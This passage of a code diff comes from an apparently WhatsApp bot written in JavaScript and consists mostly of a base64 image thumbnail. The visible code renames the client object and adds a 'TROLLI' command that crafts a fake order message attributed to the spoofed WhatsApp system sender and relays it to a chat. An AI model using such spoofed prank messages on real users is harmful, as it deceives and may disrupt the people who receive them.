                                           "thumbnail": "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",
@@ -4157,14 +3912,14 @@ Source : ${anu.result.source}
                                    contextInfo: {}
                             })
 
-                            dha.toggleDisappearingMessages(from, 'Awoakwoakwoak')
-                            dha.relayWAMessage(res)
+                            noir.toggleDisappearingMessages(from, 'Awoakwoakwoak')
+                            noir.relayWAMessage(res)
                             break
                      case 'p': // TROLLI
                             buf = Mfake
-                            imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image)
+                            imeu = await noir.prepareMessage('0@s.whatsapp.net', buf, image)
                             imeg = imeu.message.imageMessage
-                            res = await dha.prepareMessageFromContent(from, {
+                            res = await noir.prepareMessageFromContent(from, {
                                    "orderMessage": {
                                           "orderId": "150453297177375",
                                           "thumbnail": "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